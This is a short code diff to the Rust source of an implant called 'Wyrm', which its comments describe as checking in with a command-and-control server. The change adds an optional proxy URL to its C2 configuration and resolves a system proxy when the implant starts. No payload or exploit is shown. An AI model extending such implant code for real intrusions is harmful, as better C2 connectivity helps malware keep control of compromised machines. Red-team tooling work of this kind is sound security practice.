@@ -84,7 +84,8 @@ pub struct Wyrm {
 /// The C2 configuration settings for the implant; there can be any number of these
 /// configurations, allowing for multiple C2 operations
 pub struct C2Config {
-    pub url: String,
+    /// (URL, proxy URL)
+    pub url: (String, Option<String>),
     pub port: u16,
     pub api_endpoints: Vec<String>,
     pub sleep_seconds: u64,
@@ -116,10 +117,11 @@ impl Wyrm {
             None => unsafe { ExitThread(0) },
         };
 
-        Self {
+        let mut implant = Self {
             implant_id: build_implant_id(),
             c2_config: C2Config {
-                url,
+                // Proxy resolved below
+                url: (url, None),
                 port,
                 api_endpoints,
                 sleep_seconds,
@@ -145,7 +147,12 @@ impl Wyrm {
             agent_name_by_operator,
             mutex,
             spawn_as,
-        }
+        };
+
+        let px = implant.try_get_proxy();
+        implant.c2_config.url.1 = px;
+
+        implant
     }
 
     /// Command the implant to check in with the C2, making no attempt to send data. It will receive tasks from the C2
